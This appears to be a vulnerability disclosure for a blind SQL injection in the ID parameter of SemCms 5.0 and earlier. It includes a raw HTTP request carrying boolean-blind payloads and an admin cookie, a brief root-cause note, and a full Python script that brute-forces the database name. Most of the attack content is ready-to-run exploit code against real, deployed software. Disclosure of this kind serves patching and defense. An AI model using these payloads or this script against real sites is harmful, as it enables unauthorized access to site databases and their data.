# SemCms <= 5.0 has a SQL Injection Vulnerability
##### Vulnerability Location: SEMCMS_InquiryView.php
##### Affected Range: SemCms <= 5.0
##### Vulnerability Cause: SemCms <= v5.0 was discovered to contain a SQL injection vulnerability.This allows an attacker to execute arbitrary code via the ID parameter in the SEMCMS_InquiryView.php component.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions.
##### Link:https://www.sem-cms.com/

# Vulnerability recurrence

After entering the background.

![image](https://github.com/user-attachments/assets/d9c6c1ee-b05d-47e7-b060-6bdbfa35c8d8)

When ID=1, there is relevant content, but when ID=2, there is no related content. Therefore, Boolean blind annotation is used to determine the length of the database name:

![image](https://github.com/user-attachments/assets/8814064b-8a15-49ad-95a6-3102f6e31e8f)
![image](https://github.com/user-attachments/assets/079473ff-5645-4b18-a048-24de2a04c4db)

Finally, the length of the database name is obtained as 8. Next, determine the specific value of the database name:

![image](https://github.com/user-attachments/assets/ebb5a85d-2449-4a07-aeba-6ffaadeea461)

Finally, the database username is obtained as semcms50, and the yakit data packet:

```
GET /admin/SEMCMS_InquiryView.php?ID=if(substr(database(),{{int(1-8)}},1)+like+"{{payload(word)}}",1,2) HTTP/1.1
Host: localhost:83
Upgrade-Insecure-Requests: 1
Cookie: scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Accept-Encoding: gzip, deflate, br, zstd
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
sec-ch-ua-mobile: ?0
Accept-Language: zh-CN,zh;q=0.9
sec-ch-ua: "Google Chrome";v="137", "Chromium";v="137", "Not/A)Brand";v="24"
sec-ch-ua-platform: "Windows"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
```

# Code Analysis
Line 7 of `SEMCMS_InquiryView.php`

![image](https://github.com/user-attachments/assets/b2f79a77-7a88-410b-bfd8-c5846bc5c428)

The ID parameter is obtained through the GET method and directly concatenated into the SQL statement, thus there is an SQL injection vulnerability

# Vulnerability exploitation script

```
import requests
import string
import time
from urllib.parse import parse_qs, urlencode
# 需要通过页面的回显来修改判断的条件
# 需要后台路径
# 需要更新Cookie

# 发送请求
def send_request(url, headers):
    try:
        response = requests.get(
            url,
            headers=headers,
            timeout=10,
            verify=False
        )

        return response
    except Exception as e:
        print(f"请求失败: {e}")
        return None


# 爆破数据库名长度
def database_length():
    print("[*] 开始爆破数据库名长度...")
    for i in range(1,20):
        base_url = url + f'if(length(database())>{i},999,1)'
        resp = send_request(base_url,header).text
        if 'Smart' in resp:
            print("数据库名长度为：" + str(i))
            return i 
            

# 爆破数据库名
def exploit_sql_injection(url, header, db_len):
    
    
    db_name = ""
    
    max_length = 32  # 假设数据库名最大长度
    
    # 字符集：小写字母、数字、常见符号
    charset = string.ascii_lowercase + string.digits + "-$@! "
    

    print("[*] 开始爆破数据库名...")

    for i in range(1,db_len+1):
        for j in charset:
            base_url = url + f'if(substr(database(),{i},1) like "{j}",1,999)'
            resp = send_request(base_url, header).text
            if 'Smart' in resp:
                db_name += str(j)
                print(f"[+] 第{i}个位置的字符: '{j}' 匹配成功, 当前: {db_name}")
                break

    
    print(f"[*] 爆破完成! 数据库名: {db_name}")
    return db_name

if __name__ == "__main__":
    url = f"http://192.168.124.6:81/VvK4qw_Admin/SEMCMS_InquiryView.php?ID="
    
    db_len = 0

    header = {
        "Cookie":"scusername=%E6%80%BB%E8%B4%A6%E5%8F%B7; scuseradmin=Admin; scuserpass=c4ca4238a0b923820dcc509a6f75849b"
    }

    db_len = database_length()

    if(db_len != 0):
        exploit_sql_injection(url, header,db_len)
    

```
